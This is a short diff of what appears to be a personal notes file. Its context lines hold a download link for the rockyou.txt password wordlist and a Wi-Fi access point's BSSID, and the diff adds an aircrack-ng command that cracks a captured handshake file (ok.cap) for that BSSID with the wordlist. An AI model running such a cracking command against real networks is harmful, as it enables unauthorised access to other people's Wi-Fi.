@@ -2,3 +2,6 @@ https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.tx
 
 
 BSSID: a0:9b:17:8e:fb:09
+
+
+aircrack-ng -w rockyou.txt -b a0:9b:17:8e:fb:09 ok.cap
